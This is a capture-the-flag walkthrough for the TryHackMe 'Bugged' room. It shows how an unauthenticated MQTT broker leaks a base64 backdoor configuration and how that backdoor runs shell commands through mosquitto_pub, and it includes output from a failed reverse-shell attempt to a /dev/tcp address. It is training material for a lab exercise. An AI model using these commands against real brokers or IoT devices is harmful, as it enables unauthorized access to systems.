# Bugged

John likes to live in a very Internet connected world. Maybe too connected...

John was working on his smart home appliances when he noticed weird traffic going across the network. Can you help him figure out what these weird network communications are?

Room: https://tryhackme.com/room/bugged

⚠️ STOP

Stuck and need a nudge in the right direction?

➡️ Try the hints page before reading the full solution: https://github.com/garthheff/CTF-Hints/blob/main/bugged.md


-----------------


## Overview

This room exposed an MQTT service on port `1883`. At first it looked like a normal Mosquitto broker publishing smart-home style telemetry, but one topic contained a base64 encoded configuration for a hidden command channel.

By decoding the MQTT messages, we found a backdoor ID, command topics, and the expected message format. This allowed us to execute commands through MQTT and read the flag from the target.

## Enumeration

I started with a full TCP port scan.

```bash
sudo nmap -sV -sC -p- --min-rate 5000 -oN nmap-sv-all.txt 10.66.130.32
```

The scan found two open ports.

```text
22/tcp   open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.13
1883/tcp open  mosquitto version 2.0.14
```

The interesting service was MQTT on port `1883`.

Nmap also showed several MQTT topics and retained payloads.

```text
patio/lights
storage/thermostat
livingroom/speaker
```

Example payloads looked like this.

```json
{"id":15495857237127453738,"color":"GREEN","status":"OFF"}
```

At this stage, the MQTT broker appeared to be unauthenticated, so I installed and used the Mosquitto client tools.

```bash
sudo apt install mosquitto-clients -y
```

## Subscribing To MQTT Topics

I subscribed to all topics using `#`.

```bash
mosquitto_sub -h 10.66.130.32 -p 1883 -t '#' -v
```

This produced the normal telemetry topics, but also revealed a much more interesting topic.

```text
yR3gPp0r8Y/AGlaMxmHJe/qV66JF5qmH/config eyJpZCI6ImNkZDFiMWMwLTFjNDAtNGIwZi04ZTIyLTYxYjM1NzU0OGI3ZCIsInJlZ2lzdGVyZWRfY29tbWFuZHMiOlsiSEVMUCIsIkNNRCIsIlNZUyJdLCJwdWJfdG9waWMiOiJVNHZ5cU5sUXRmLzB2b3ptYVp5TFQvMTVIOVRGNkNIZy9wdWIiLCJzdWJfdG9waWMiOiJYRDJyZlI5QmV6L0dxTXBSU0VvYmgvVHZMUWVoTWcwRS9zdWIifQ==
```

The topic name ended in `/config`, and the payload looked like base64.

## Decoding The Backdoor Config

I decoded the payload.

```bash
echo 'eyJpZCI6ImNkZDFiMWMwLTFjNDAtNGIwZi04ZTIyLTYxYjM1NzU0OGI3ZCIsInJlZ2lzdGVyZWRfY29tbWFuZHMiOlsiSEVMUCIsIkNNRCIsIlNZUyJdLCJwdWJfdG9waWMiOiJVNHZ5cU5sUXRmLzB2b3ptYVp5TFQvMTVIOVRGNkNIZy9wdWIiLCJzdWJfdG9waWMiOiJYRDJyZlI5QmV6L0dxTXBSU0VvYmgvVHZMUWVoTWcwRS9zdWIifQ==' | base64 -d
```

The decoded JSON revealed the backdoor configuration.

```json
{
  "id": "cdd1b1c0-1c40-4b0f-8e22-61b357548b7d",
  "registered_commands": [
    "HELP",
    "CMD",
    "SYS"
  ],
  "pub_topic": "U4vyqNlQtf/0vozmaZyLT/15H9TF6CHg/pub",
  "sub_topic": "XD2rfR9Bez/GqMpRSEobh/TvLQehMg0E/sub"
}
```

Important values:

```text
Backdoor ID: cdd1b1c0-1c40-4b0f-8e22-61b357548b7d
Publish topic: U4vyqNlQtf/0vozmaZyLT/15H9TF6CHg/pub
Subscribe topic: XD2rfR9Bez/GqMpRSEobh/TvLQehMg0E/sub
Commands: HELP, CMD, SYS
```

This looked like a command-and-control style MQTT backdoor.

## Finding The Message Format

I tried sending a simple message first, which caused the backdoor to respond with an error.

The response came back on the publish topic.

```text
U4vyqNlQtf/0vozmaZyLT/15H9TF6CHg/pub SW52YWxpZCBtZXNzYWdlIGZvcm1hdC4KRm9ybWF0OiBiYXNlNjQoeyJpZCI6ICI8YmFja2Rvb3IgaWQ+IiwgImNtZCI6ICI8Y29tbWFuZD4iLCAiYXJnIjogIjxhcmd1bWVudD4ifSk=
```

Decoding the response showed the expected format.

```bash
echo 'SW52YWxpZCBtZXNzYWdlIGZvcm1hdC4KRm9ybWF0OiBiYXNlNjQoeyJpZCI6ICI8YmFja2Rvb3IgaWQ+IiwgImNtZCI6ICI8Y29tbWFuZD4iLCAiYXJnIjogIjxhcmd1bWVudD4ifSk=' | base64 -d
```

Decoded response:

```text
Invalid message format.
Format: base64({"id": "<backdoor id>", "cmd": "<command>", "arg": "<argument>"})
```

So the correct format was:

```json
{"id":"<backdoor id>","cmd":"<command>","arg":"<argument>"}
```

Then that JSON needed to be base64 encoded and published to the backdoor subscription topic.

## Creating A Response Listener

To make the output easier to read, I created a listener that automatically decoded the base64 responses.

```bash
mosquitto_sub -h 10.66.130.32 -p 1883 \
  -t 'U4vyqNlQtf/0vozmaZyLT/15H9TF6CHg/pub' \
  -v | while read topic payload; do echo "[$topic]"; echo "$payload" | base64 -d; echo; done
```

## Command Execution

I tested command execution with `id`.

```bash
mosquitto_pub -h 10.66.130.32 -p 1883 \
  -t 'XD2rfR9Bez/GqMpRSEobh/TvLQehMg0E/sub' \
  -m "$(echo -n '{"id":"cdd1b1c0-1c40-4b0f-8e22-61b357548b7d","cmd":"CMD","arg":"id"}' | base64 -w0)"
```

The response confirmed command execution as the `challenge` user.

```json
{
  "id": "cdd1b1c0-1c40-4b0f-8e22-61b357548b7d",
  "response": "uid=1000(challenge) gid=1000(challenge) groups=1000(challenge)\n"
}
```

## Checking Available Tools

I checked which useful tools existed on the target.

```bash
mosquitto_pub -h 10.66.130.32 -p 1883 \
  -t 'XD2rfR9Bez/GqMpRSEobh/TvLQehMg0E/sub' \
  -m "$(echo -n '{"id":"cdd1b1c0-1c40-4b0f-8e22-61b357548b7d","cmd":"CMD","arg":"which bash; which nc; which python3; which python; which perl"}' | base64 -w0)"
```

The target had bash, Python 3, and Perl.

```text
/bin/bash
/usr/bin/python3
/usr/bin/perl
```

A reverse shell was attempted, but the target could not route back to the AttackBox IP.

```text
bash: connect: Network is unreachable
bash: line 1: /dev/tcp/10.66.103.39/4444: Network is unreachable
```

Since command execution over MQTT worked reliably, a reverse shell was not required.

## Finding The Flag

I searched for likely flag files.

```bash
mosquitto_pub -h 10.66.130.32 -p 1883 \
  -t 'XD2rfR9Bez/GqMpRSEobh/TvLQehMg0E/sub' \
  -m "$(echo -n '{"id":"cdd1b1c0-1c40-4b0f-8e22-61b357548b7d","cmd":"CMD","arg":"find / -name flag.txt 2>/dev/null"}' | base64 -w0)"
```

The flag was found at:

```text
/home/challenge/flag.txt
```

## Reading The Flag

I used the MQTT command channel to read the flag.

```bash
mosquitto_pub -h 10.66.130.32 -p 1883 \
  -t 'XD2rfR9Bez/GqMpRSEobh/TvLQehMg0E/sub' \
  -m "$(echo -n '{"id":"cdd1b1c0-1c40-4b0f-8e22-61b357548b7d","cmd":"CMD","arg":"cat /home/challenge/flag.txt"}' | base64 -w0)"
```

The decoded response contained the flag.

```text
flag{REDACTED}
```

## Summary

The main issue in this room was an unauthenticated MQTT broker exposing a hidden backdoor configuration. Subscribing to all topics revealed a base64 encoded config message. Decoding it gave the backdoor ID, command topics, and supported commands.

The backdoor required messages in this format:

```text
base64({"id": "<backdoor id>", "cmd": "<command>", "arg": "<argument>"})
```

Using the `CMD` command, arbitrary shell commands could be executed as the `challenge` user. A reverse shell was attempted, but outbound routing failed, so the MQTT command channel was used directly to find and read the flag.

## Key Takeaways

* Always subscribe to `#` when testing unauthenticated MQTT.
* MQTT retained messages can leak sensitive configuration.
* Base64 encoded payloads are worth decoding, especially on config or command topics.
* MQTT command channels can be used like a limited shell even without a reverse shell.
* Reverse shells are helpful, but not required if command output is returned through the protocol.
